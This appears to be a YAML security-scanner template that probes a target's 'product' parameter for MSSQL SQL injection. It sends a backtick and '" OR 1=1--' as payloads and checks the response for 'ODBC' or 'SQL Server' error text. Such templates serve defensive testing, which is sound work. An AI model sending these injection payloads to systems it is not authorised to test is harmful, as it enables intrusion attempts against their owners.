id: sqli6-mssql-03
name: 'SQLi mssql probe in product'
severity: high
type: active
tags:
  - sqli
  - injection
  - mssql
description: 'Triggers mssql error via product'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      product:
        - '`'
        - '" OR 1=1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ODBC'
          - 'SQL Server'
